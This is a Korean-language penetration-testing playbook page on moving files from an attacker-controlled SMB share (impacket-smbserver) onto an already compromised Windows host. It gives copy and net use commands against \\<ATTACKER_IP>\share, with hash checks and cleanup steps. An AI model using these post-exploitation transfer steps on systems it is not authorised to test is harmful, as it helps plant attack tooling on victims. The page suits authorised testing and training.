---
tags:
  - 환경/windows
  - 서비스/smb
시작조건: ["Windows 대상 셸 확보", "Windows 대상에서 공격 호스트의 SMB 445/TCP에 연결 가능"]
필요권한: ["Windows 대상의 저장 경로 쓰기 권한", "공격 호스트의 공유 디렉터리 읽기 권한"]
필요조건: ["반입할 파일", "공격 호스트 SMB 주소와 공유명", "Guest 차단 시 임시 SMB 사용자명과 비밀번호"]
결과: ["Windows 대상에 반입한 파일", "송신본과 수신본의 SHA-256 비교 결과"]
---

# SMB 공유로 Windows 파일 반입

## 한 줄 판단

Windows 대상 셸에서 공격 호스트의 SMB 445/TCP에 연결할 수 있고 대상 저장 경로에 쓸 수 있으면, 공격 호스트에 SMB 공유를 열고 UNC 경로 또는 인증된 드라이브에서 파일을 복사한 뒤 양쪽 SHA-256을 비교한다.

## 사용할 때

- Windows 대상에 실행 파일·스크립트·설정 파일을 반입해야 할 때.
- 대상에서 공격 호스트의 SMB 445/TCP로 연결할 수 있을 때.
- HTTP 클라이언트보다 Windows의 `copy`·`net use`를 바로 사용할 수 있을 때.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 통신 방향 | Windows 대상에서 공격 호스트의 445/TCP 도달 | `Test-NetConnection <ATTACKER_IP> -Port 445` | 주소, route와 방화벽 확인 |
| 송신 파일 | 공격 호스트 공유 디렉터리에 파일 존재 | `sha256sum <SOURCE_FILE>` | 공유 경로와 파일명 확인 |
| 대상 저장 경로 | 현재 Windows 계정으로 파일 생성 가능 | `<DESTINATION_DIRECTORY>`에 임시 파일 생성 | 디렉터리 ACL과 디스크 공간 확인 |
| SMB 인증 | Guest 접근 허용 또는 임시 공유 계정 사용 가능 | 첫 UNC 접근 결과 | Guest 차단이면 인증 공유로 전환 |

## 실행

### Linux 공격 호스트에서 SMB 공유 시작

먼저 445/TCP를 사용 중인 기존 listener가 없는지 확인한다. SMB 서버는 전용 터미널에서 시작하고, 두 번째 Linux 터미널의 `ss` 출력에서 실제 listener PID를 `<SMB_SERVER_PID>`로 기록한다.

```bash
sudo ss -ltnp 'sport = :445'
sha256sum <SHARE_DIRECTORY>/<SOURCE_FILE>
sudo impacket-smbserver share -smb2support <SHARE_DIRECTORY>
```

두 번째 Linux 터미널:

```bash
sudo ss -ltnp 'sport = :445'
```

Guest 접근이 차단되면 사용자명과 비밀번호를 지정해 다시 시작한다.

```bash
sudo impacket-smbserver share -smb2support <SHARE_DIRECTORY> -user <SMB_USER> -password '<SMB_PASSWORD>'
```

인증 방식으로 다시 시작했다면 두 번째 터미널에서 445/TCP listener를 다시 조회해 새 `<SMB_SERVER_PID>`를 기록한다.

### Windows 대상 호스트에서 복사

실행 전에 목적지와 기존 network drive를 확인한다. `<SMB_DRIVE>:`는 `net use`에 없는 drive letter를 고른다.

```cmd
if exist "<DESTINATION_FILE>" echo DESTINATION_EXISTS
net use
```

`DESTINATION_EXISTS`가 출력되면 복사를 진행하지 않고 새 목적지 이름을 정한다.

Guest 접근이 가능한 경우:

```cmd
copy /-Y \\<ATTACKER_IP>\share\<SOURCE_FILE> "<DESTINATION_FILE>"
certutil -hashfile "<DESTINATION_FILE>" SHA256
```

`You can't access this shared folder because ... block unauthenticated guest access`가 나오면 같은 명령을 반복하지 않고 인증 공유를 연결한다.

```cmd
net use <SMB_DRIVE>: \\<ATTACKER_IP>\share /user:<SMB_USER> <SMB_PASSWORD>
copy /-Y <SMB_DRIVE>:\<SOURCE_FILE> "<DESTINATION_FILE>"
certutil -hashfile "<DESTINATION_FILE>" SHA256
net use <SMB_DRIVE>: /delete
```

확인할 출력:

- `The command completed successfully`는 SMB 드라이브 연결 성공이다.
- `1 file(s) copied.`와 실제 `<DESTINATION_FILE>` 생성을 함께 확인한다.
- 공격 호스트의 원본과 Windows 대상의 SHA-256이 같아야 반입 완료다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| SMB 연결, 파일 생성과 SHA-256 일치 | 파일 반입 완료 | Windows 대상의 반입 파일 | 파일 실행 조건과 현재 권한을 별도 확인 |
| Guest 정책 차단 메시지 | 익명 SMB 공유 사용 불가 | SMB 경로는 도달하지만 인증 필요 | 임시 인증 공유와 `net use` 사용 |
| `System error 53` 또는 연결 실패 | SMB 경로·주소·공유명 문제 | 파일 미반입 | 445/TCP, 공격 호스트 listener와 공유명 확인 |
| `Access is denied` 또는 대상 쓰기 실패 | 공유 읽기 또는 대상 디렉터리 쓰기 권한 부족 | 파일 미반입 | 오류가 난 경로의 ACL과 현재 계정 확인 |
| 복사됐지만 SHA-256 불일치 | 파일 손상 또는 다른 파일 복사 | 손상된 반입 파일 | 실행하지 말고 경로와 원본을 확인해 재전송 |

## 확인할 출력과 권한

- SMB 드라이브 연결, 파일 복사와 무결성 확인은 서로 다른 완료 단계다.
- 파일 반입은 실행 성공이나 권한 상승을 뜻하지 않는다.

## 변경 영향과 복구

대상에서 반입 파일을 사용하는 process를 먼저 종료한 뒤 파일과 이번 drive mapping을 정리하고, 마지막에 공격 호스트의 SMB listener를 종료한다.

| 변경 대상 | 기존 상태·식별값 | 복구 절차 | 완료 확인 |
|---|---|---|---|
| 대상 저장 파일 | 실행 전 존재하지 않은 `<DESTINATION_FILE>`과 전송 후 SHA-256 | Windows 대상에서 `del "<DESTINATION_FILE>"` | `if exist "<DESTINATION_FILE>" echo FILE_STILL_EXISTS`가 출력되지 않음 |
| 인증 SMB drive | 실행 전 `net use`에 없던 `<SMB_DRIVE>:`와 UNC 경로 | Windows 대상에서 `net use <SMB_DRIVE>: /delete` | `net use`에 해당 drive와 UNC가 없음 |
| SMB listener | 실행 전 445/TCP 상태, `<SMB_SERVER_PID>`와 command line | 원격 파일·mapping 정리 확인 뒤 Linux 공격 호스트에서 `sudo kill <SMB_SERVER_PID>` | `sudo ss -ltnp 'sport = :445'`에 기록한 PID가 없음 |

기존 파일·drive mapping·445/TCP listener가 있으면 이름만 같은 항목을 제거하지 말고 다른 경로·drive·호스트를 선택한다. listener 종료가 실패하면 PID와 command line을 대조하며 모든 Impacket·Python process를 일괄 종료하지 않는다. 임시 SMB 비밀번호는 실제 값 대신 placeholder로만 문서화하고 작업 종료 뒤 재사용하지 않는다.

## 관련 도구

- [[impacket-smbserver]]

## 관련 상태 라우터

- [[상황별 파일 전송]]

## 참고 링크

- [Fortra Impacket: smbserver.py](https://github.com/fortra/impacket/blob/master/examples/smbserver.py)
